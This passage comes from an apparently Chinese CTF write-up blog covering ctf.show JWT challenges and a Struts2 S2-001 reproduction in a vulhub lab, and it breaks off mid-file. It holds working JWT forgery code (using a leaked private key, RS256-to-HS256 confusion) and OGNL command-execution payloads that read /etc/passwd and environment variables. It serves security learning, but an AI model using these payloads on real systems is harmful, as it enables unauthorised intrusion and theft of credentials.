class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405094524472.png" alt="image-20220405094524472"></p><p>是rs256加密,有公钥和私钥,从app.py文件中可以看到从public&#x2F;private.key读取了私钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://f86be22f-fd82-48a7-a764-23d8f76ecd98.challenge.ctf.show//private.key</span><br></pre></td></tr></table></figure><p>试一下在这个目录下下载了私钥</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405094815009.png" alt="image-20220405094815009"></p><p>接着有两种方法,一是得到私钥和公钥解密加密.二是用私钥自己生成公钥</p><p>jwt.io网站解不了,用python了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python3</span><br><span class="line">import jwt</span><br><span class="line">public = open(&#x27;private.key&#x27;, &#x27;r&#x27;).read()</span><br><span class="line">payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;</span><br><span class="line">print(jwt.encode(payload, key=public, algorithm=&#x27;RS256&#x27;))</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.AH4YkjLWhtkoxco48abhQ7MUfxBgyfP3OffsS6cZmHtfLpVlv9t8bZAnW-CVbLkHfu4vzQI_OiPdBQP-a3xJIOq3hf0jsMAsijn-XKaaDZtv3cg4a0RvjpEHLYCN89KpigGHC0vtOb6OzffdmkPVN8vcYJby742vD_YhDDHw6pU</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405101247457.png" alt="image-20220405101247457"></p><p>这次是用post访问原始目录</p><p>自己安装node.js并安装jsonwebtoken库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install jsonwebtoken --save</span><br></pre></td></tr></table></figure><p>运行node.js</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node</span><br></pre></td></tr></table></figure><p>传入下面的值,要在private.key目录运行node哦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;);</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line">var privateKey = fs.readFileSync(&#x27;private.key&#x27;);</span><br><span class="line">var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;RS256&#x27; &#125;);</span><br><span class="line">console.log(token)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102051057.png" alt="image-20220405102051057"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102156452.png" alt="image-20220405102156452"></p><h1 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h1><p>给了源码包,只有一个公钥</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102424298.png" alt="image-20220405102424298"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102355152.png" alt="image-20220405102355152"></p><p>同样的加密</p><p>将 RS256 算法改为 HS256（非对称密码算法&#x3D;&gt;对称密码算法）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HS256算法使用密钥为所有消息进行签名和验证</span><br><span class="line">而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证</span><br><span class="line">如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名</span><br><span class="line">由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名</span><br><span class="line">这样的话，后端代码使用RSA公钥+HS256算法进行签名验证</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102757993.png" alt="image-20220405102757993"></p><p>记得替换一下原先目录下的公钥文件哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102802757.png" alt="image-20220405102802757"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">破解HS256（对称加密算法）密钥</span><br><span class="line">    如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。</span><br><span class="line">    然后，用蛮力方式对密钥进行猜解，具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。</span><br><span class="line">    此外，我们也可以使用PyJWT或John Ripper进行破解测试。</span><br><span class="line">    附录：相关工具</span><br><span class="line">    PyJWT库具体地址为：https://github.com/jpadilla/pyjwt。</span><br><span class="line">    &gt;&gt;&gt; import jwt</span><br><span class="line">    &gt;&gt;&gt; encoded = jwt.encode(&#123;&#x27;some&#x27;: &#x27;payload&#x27;&#125;, &#x27;secret&#x27;, algorithm=&#x27;HS256&#x27;)  &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&#x27;</span><br><span class="line">    &gt;&gt;&gt; jwt.decode(encoded, &#x27;secret&#x27;, algorithms=[&#x27;HS256&#x27;])</span><br><span class="line">    &#123;&#x27;some&#x27;: &#x27;payload&#x27;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/ctfshow/ctf.show/java/"/>
      <url>/ctfshow/ctf.show/java/</url>
      
        <content type="html"><![CDATA[<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271215561.png" alt="image-20220327121545509"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271215318.png" alt="image-20220327121553262"></p><p>发现一个链接,直接点过去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271216806.png" alt="image-20220327121656757"></p><p>查看源码,发现一个链接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271219406.png" alt="image-20220327121913334"></p><p>发现服务器500错误,得知是struts2框架</p><p>struts2框架是用java语言编写的一个基于MVC这几模式的web应用框架,关于struts2漏洞</p><p>判断是struts2框架的方法</p><ol><li>通过页面的回显错误消息来判断,页面不回显错误消息是则无效</li><li>通过网页后缀来判断,如.do.action,有可能不准</li><li>判断&#x2F;struts&#x2F;webconsole.html是否存在来进行判断,需要devMode为true</li></ol><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>通过actionErrors.要求是对应的Action需要继承自ActionSupport类,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始url为https://threathunter.org/则检测所用的url为https://threathunter.org/?actionErrors=111</span><br></pre></td></tr></table></figure><p>如果返回的页面出现异常,则可以认定为目标是基于struts2构建的.异常包括但不限于</p><ol><li>页面直接出现404或者500等错误</li><li>页面上输出了与业务有关错误消息,或者1111被回显到了页面上</li><li>页面内容结构发生了明显的改变</li><li>页面发生了重定向</li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过CheckboxInterceptor.</p><p>要求:需要有一个能够回显到页面上的字符串类型的参数,一般就是各个目标的搜索功能,搜索功能往往会将keyword回显到页面上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始url: https://threathunter.org/?keyword=aaa,且页面回显出了aaa检测url: https://threathunter.org/?__checkbox_keyword=aaa,如果返现回显变成了false,则可以认定目标是基于struts2开发的</span><br></pre></td></tr></table></figure><p>原理是CheckboxInterceptor发现了一个名为__checkbox_keyword的参数,但是没有发现keyword参数,则他会添加一个keyword参数,并将其值设置为false</p><p>回到本题,s2-001是一个struts2命令执行漏洞编号,</p><h2 id="这里复现一下struts2漏洞s2-001"><a href="#这里复现一下struts2漏洞s2-001" class="headerlink" title="这里复现一下struts2漏洞s2-001"></a>这里复现一下struts2漏洞s2-001</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>struts2漏洞s2-001是当用户提交表单数据且验证失败时,服务器使用OGNL表达式解析用户先前提交的参数值,%{value}并重新填充响应的表单数据,例如,在注册或登录页面中,如果提交失败,则服务器通常默认情况下将返回先前提交的数据.由于服务器用于%{value}对提交的数据执行OGNL表达式解析,因此服务器可以直接发送有效载荷看来执行命令</p><h3 id="vulhub漏洞利用"><a href="#vulhub漏洞利用" class="headerlink" title="vulhub漏洞利用"></a>vulhub漏洞利用</h3><h4 id="docker正式安装"><a href="#docker正式安装" class="headerlink" title="docker正式安装"></a>docker正式安装</h4><p>确保 yum 包更新到最新</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure><p>卸载旧版本（如果安装过旧版本的话）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker  docker-common docker-selinux docker-engine</span><br></pre></td></tr></table></figure><p>安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure><p>设置yum源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>可以查看所有仓库中所有docker版本，并选择特定版本安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce  #由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0</span><br><span class="line">执行上面的命令是默认安装，下面这条命令就不用执行了</span><br><span class="line">yum install &lt;FQPN&gt;  # 例如：sudo yum install docker-ce-17.12.0.ce</span><br></pre></td></tr></table></figure><p>启动并加入开机启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>验证安装是否成功(有client和service两部分表示docker安装启动都成功了)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><h4 id="docker容器中下载weblogic12c（可略过不看）"><a href="#docker容器中下载weblogic12c（可略过不看）" class="headerlink" title="docker容器中下载weblogic12c（可略过不看）"></a>docker容器中下载weblogic12c（可略过不看）</h4><ul><li>获取镜像</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line">//docker pull #获取镜像</span><br><span class="line">//ismaleiva90/weblogic #weblogic的镜像，后面没有指定镜像版本就会获取默认的 latest版本</span><br></pre></td></tr></table></figure><ul><li>生成并启动容器</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">//docker run    #启动</span><br><span class="line">//-d    #使得容器后台运行</span><br><span class="line">//-p   #指定端口号</span><br><span class="line">//ismaleiva90/weblogic：latest  #镜像的详细信息</span><br><span class="line"></span><br><span class="line">//2018/3/6 启动命令： docker run -d -p 7001:7001 -p 7002:7002 --restart=always //ismaleiva90/weblogic12:latest</span><br><span class="line">//启动命令更改之后，访问端口变为 7001，  http://172.17.0.1:7001/console</span><br><span class="line">docker run -d -p 7001:7001 -p 7002:7002 --restart=always ismaleiva90/weblogic12:latest</span><br></pre></td></tr></table></figure><ul><li>在浏览器中访问weblogic<a href="http://172.17.0.1:49163/console">http://172.17.0.1:49163/console</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.150.19.40  #当前主机的ip地址</span><br><span class="line">49163 #访问端口号</span><br><span class="line">访问结果，出现登录页面</span><br></pre></td></tr></table></figure><ul><li>登录账号和密码：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：  weblogic</span><br><span class="line">密码：    welcome1</span><br></pre></td></tr></table></figure><h4 id="docker容器中下载vulhub漏洞环境"><a href="#docker容器中下载vulhub漏洞环境" class="headerlink" title="docker容器中下载vulhub漏洞环境"></a>docker容器中下载vulhub漏洞环境</h4><p>docker-compose 的安装及使用</p><p>Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。使用 Docker Compose 不再需要使用 shell 脚本来启动容器。(通过 docker-compose.yml 配置)</p><p>安装</p><p>可以通过修改 URL 中的版本，自定义您需要的版本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>卸载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h4 id="正式下载漏洞环境Vulhub"><a href="#正式下载漏洞环境Vulhub" class="headerlink" title="正式下载漏洞环境Vulhub"></a>正式下载漏洞环境Vulhub</h4><p>下载docker漏洞环境：Vulhub</p><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><p>搭建漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">https://github.com/vulhub/vulhub/archive/master.zip   //直接下载地址</span><br></pre></td></tr></table></figure><p>改一下国内镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">添加</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://nfesww3w.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入命令，重启docker即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>进入&#x2F;root&#x2F;vulhub&#x2F;struts2&#x2F;s2-001目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d //安装此漏洞环境</span><br><span class="line">docker ps //查看运行服务端口</span><br></pre></td></tr></table></figure><p>访问ip:port即可看到web网页</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271330427.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down //测试完毕之后，使用此命令即可结束服务，使环境变为初始状态。</span><br></pre></td></tr></table></figure><p>测试payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271804744.png" alt="image-20220327180450692"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271804611.png" alt="image-20220327180459579"></p><p>这次我们试一试命令执行，new java.lang.String[ {“cat”,”&#x2F;etc&#x2F;passwd”} 在这里更改我们想要执行的命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>利用语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">命令执行</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>OGNL表达式中的三个符号% # $</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%的用途是在标志的属性为字符串类型时,计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line">#的用途主要是访问非根对象的属性,因为struts中值栈被视为根对象,所以访问其他非根对象时,需要加#前缀才可以调用</span><br><span class="line">$主要是在struts配置文件中,引用OGNL表达式</span><br></pre></td></tr></table></figure><p><strong>env命令</strong></p><p>env命令用于显示系统中已存在的环境变量,以及在定义的环境中执行命令.该命令只使用”-“作为参数选项时,隐藏了选项中的”-i”的功能若没有设置任何选项和参数的时候,则直接显示当前的环境变量</p><p>如果使用env命令在环境中执行命令时,会因为没有定义环境变量”PATH”而提示错误信息”such file or directory”.此时,用户可以重新定义一个新的”PATH”或者使用绝对路径</p><p>当前目录看下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271823180.png" alt="image-20220327182352142"></p><p>根目录看下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271825900.png" alt="image-20220327182549860"></p><p>env看下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line">另一种</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/proc/self/environ&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271829906.png" alt="image-20220327182906860"></p><p>这里使用工具的时候本地可以扫出来,但是平台扫不出来</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271856331.png" alt="image-20220327185629286"></p><p>这里利用的时候会报错,改一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271908402.png" alt="image-20220327190836309"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python Struts2Scan.py -u http://192.168.5.149:8080/login.action -n S2-001 --exec</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271909266.png" alt="image-20220327190910228"></p><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><h4 id="新建一个java-EE项目"><a href="#新建一个java-EE项目" class="headerlink" title="新建一个java EE项目"></a>新建一个java EE项目</h4><p>idea新建一个项目,这里刚开始会无这个页面的话,就回主页面按快捷键组合ctrl+alt+shift+&#x2F;，然后选register，接着找到javaee.legacy.project.wizard，选中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271342283.png" alt="image-20220327134224229"></p><p>添加本地tomocat服务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271348718.png" alt="image-20220327134837650"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271349883.png" alt="image-20220327134926814"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271349132.png" alt="image-20220327134957066"></p><p>创建好的目录结构</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271350162.png" alt="image-20220327135032129"></p><h4 id="在web-x2F-WEB-INF目录下面创建两个文件夹-classes和lib"><a href="#在web-x2F-WEB-INF目录下面创建两个文件夹-classes和lib" class="headerlink" title="在web&#x2F;WEB-INF目录下面创建两个文件夹:classes和lib"></a>在web&#x2F;WEB-INF目录下面创建两个文件夹:classes和lib</h4><p>classes用来存放编译后输出的class文件,lib用于存放第三方jar包</p><p>配置文件夹路径</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271357772.png" alt="image-20220327135728679"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271357040.png" alt="image-20220327135746950"></p><p>改成刚才新建的classes文件夹</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271359876.png" alt="image-20220327135949824"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271454814.png" alt="image-20220327145410765"></p><p>选择刚才新建的lib</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271454074.png" alt="image-20220327145457038"></p><p>配置tomcat容器</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271540450.png" alt="image-20220327154004309"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203302230559.png"></p><p>记得改下端口</p><h4 id="导入所需的jar包"><a href="#导入所需的jar包" class="headerlink" title="导入所需的jar包"></a>导入所需的jar包</h4><p><a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip">下载地址</a>这里的jar包一定要都相同,试了好久</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203302228303.png" alt="image-20220330222828098"></p><p>接下来就是我们要创建的几个文件，这里代码都给出来了，直接copy就行。（注意：一定要按照前边给出的目录结构放置下边的文件）</p><p>web.xml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;</span><br><span class="line">    &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</span><br><span class="line">    &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>index.jsp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: King kaki</span><br><span class="line">  Date: 2018/8/30</span><br><span class="line">  Time: 14:32</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;s:form action=&quot;login&quot;&gt;</span><br><span class="line">  &lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt;</span><br><span class="line">  &lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>接着在index.jsp同级目录下面创建welcome.jsp文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value=&quot;username&quot;&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span 